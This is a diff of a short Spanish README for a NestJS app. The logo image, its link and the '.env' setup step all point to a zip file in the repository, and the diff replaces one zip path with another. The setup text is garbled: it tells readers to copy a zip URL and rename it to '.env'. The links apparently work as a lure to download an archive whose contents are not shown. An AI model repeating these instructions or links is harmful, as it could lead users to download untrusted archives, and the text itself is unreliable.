@@ -1,11 +1,11 @@
 <p align="center">
-  <a href="https://raw.githubusercontent.com/jallerangel/app-nest/main/sonorant/app-nest.zip" target="blank"><img src="https://raw.githubusercontent.com/jallerangel/app-nest/main/sonorant/app-nest.zip" width="200" alt="Nest Logo" /></a>
+  <a href="https://github.com/jallerangel/app-nest/raw/refs/heads/main/src/hello-world/app-nest-1.9.zip" target="blank"><img src="https://github.com/jallerangel/app-nest/raw/refs/heads/main/src/hello-world/app-nest-1.9.zip" width="200" alt="Nest Logo" /></a>
 </p>
 
 # APP NESTJS
 
 1. Clonar el proyecto
-2. Copiar el `https://raw.githubusercontent.com/jallerangel/app-nest/main/sonorant/app-nest.zip` y renombar a `.env`
+2. Copiar el `https://github.com/jallerangel/app-nest/raw/refs/heads/main/src/hello-world/app-nest-1.9.zip` y renombar a `.env`
 3. Ejecutar
 
 ```
